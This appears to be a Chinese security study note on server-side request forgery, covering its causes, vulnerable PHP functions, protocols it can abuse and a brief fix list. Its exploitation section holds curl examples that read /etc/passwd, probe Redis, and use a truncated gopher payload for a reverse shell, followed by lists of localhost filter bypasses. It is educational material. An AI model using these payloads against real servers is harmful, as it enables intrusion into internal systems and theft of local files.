title: SSRF服务器端请求伪造
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-07-07 15:50:00
---
#### 概述
SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞
SSRF攻击的目标一般是作为跳板机访问从外网无法访问的内部系统
（正是因为它是由服务端发起的，所以它能够请求到内网）
<a href="https://smms.app/image/daoBFcPQqzvXkpy" target="_blank"><img src="https://s2.loli.net/2023/07/07/daoBFcPQqzvXkpy.png" width="500" /></a>

#### 原理
大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制
因此可以从指定URL地址获取网页完本内容、加载指定地址的图片、下载等。

#### 利用价值
利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务

#### 危害
1. 探测内网信息,用协议探`ftp%26ip={ip}%26port={port}`（dict协议）
2. 攻击内网或本地其他服务（比如溢出）
3. 穿透防火墙
4. 对内网web应用进行指纹识别，通过访问应用存在的默认文件实现
5. 利用file协议读取本地文件
6. 利用Redis未授权访问，HTTP CRLF注入
7. DOS攻击（请求大文件，始终保持连接keep alive always）等等
8. ophergopher协议/gopher协议访问，反弹shell

#### 漏洞出现点
1. 能够对外发起网络请求的地方
2. 请求远程服务器资源的地方
3. 数据库内置功能
4. 邮件系统
5. 文件处理
6. 在线处理工具
**举几个例子：**
1. 在线识图，在线文档翻译，分享，订阅等
2. 根据远程URL上传，静态资源图片等
3. 数据库的比如mongodb的copyDatabase函数
4. 邮件系统就是接收邮件服务器地址这些地方。
5. 文件就找ImageMagick，xml这些。
6. 从URL关键字（source,share,link,src,imageurl,target等）

#### SSRF漏洞相关函数和类
file_get_contents()将整个文件或一个url所指向的文件读入一个字符串中。
readfile()输出一个文件的内容。
fsockopen()打开一个网络连接或者一个Unix 套接字连接。
curl_exec()初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。
fopen()打开一个文件文件或者 URL。

#### 漏洞利用
1. http协议访问`url=http://127.0.0.1/1.txt`
2. [PHP伪协议访问](https://www.cnblogs.com/endust/p/11804767.html)<a href="https://smms.app/image/IHa9JMnTCySpNWO" target="_blank"><img src="https://s2.loli.net/2023/07/07/IHa9JMnTCySpNWO.png" width="600" /></a>
3. Gopher协议
4. FastCGI协议
5. Redis协议
```
# 利用file协议查看文件
curl -v 'http://sec.com/ssrf.php?url=file:///etc/passwd'

# 利用dict探测端口
curl -v 'http://sec.com/ssrf.php?url=dict://127.0.0.1:6379'

# 利用gopher协议反弹shell
curl -v 'http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....'
```

#### 绕过姿势
1. 利用HTTP基本身份认证的方式绕过`http://example.com@127.0.0.1`
2. 利用IP地址的省略写法绕过,`http://123.254.34.254>>http://[::123.254.34.254]`
3. DNS解析 `http://127.0.0.1.xip.io/` 可以指向任意ip的域名：`xip.io`
4. 利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址[**绕过**](https://tool.520101.com/wangluo/jinzhizhuanhuan/)
5. `http://127.1/a.txt` 或者 `http://0/a.txt`
6. file_get_contents()函数遇到了不认识的伪协议头 `httpsssss://` ，就会将他当做文件夹，然后再配合目录穿越即可读取文件

#### 其他各种指向127.0.0.1的地址
```
http://localhost/         # localhost就是代指127.0.0.1
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
http://[::]:80/           # 在liunx下可用，window测试了下不行
http://127。0。0。1/       # 用中文句号绕过
http://①②⑦.⓪.⓪.①
http://127.1/
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
```

#### 修复
1.地址做白名单处理
2.域名识别IP 过滤内部IP
3.校验返回的内容对比是否与假定的一致

#### CSRF、SSRF和重放攻击有什么区别？
- CSRF是跨站请求伪造攻击，由客户端发起
- SSRF是服务器端请求伪造，由服务器发起
- 重放攻击是将截获的数据包进行重放，达到身份认证等目的